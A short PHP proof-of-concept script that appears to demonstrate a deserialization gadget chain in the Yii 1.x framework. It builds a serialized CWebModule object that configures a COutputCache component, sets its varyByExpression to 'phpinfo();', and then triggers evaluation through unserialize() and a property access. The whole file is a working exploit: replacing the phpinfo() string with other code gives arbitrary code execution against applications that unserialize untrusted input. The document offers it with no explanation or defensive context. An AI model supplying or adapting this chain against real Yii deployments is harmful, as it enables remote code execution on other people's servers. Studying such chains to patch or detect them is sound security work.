<?php

require './vendor/autoload.php';
require './vendor/yiisoft/yii/framework/yii.php';

$config = array('basePath'=> '/var/www/', 'components' => array('cache' => array('class' => 'CDummyCache')));
Yii::createWebApplication($config);

$s  = 'O:10:"CWebModule":1:{';
$s .= 's:25:"'.chr(0).'CModule'.chr(0).'_componentConfig";';
$s .= 'a:1:{s:8:"someprop";a:3:{';
$s .= 's:5:"class";s:12:"COutputCache";s:16:"varyByExpression";s:10:"phpinfo();";s:11:"varyByRoute";b:0;';
$s .= '}}}';

$o = unserialize($s);
$o->someprop;

?>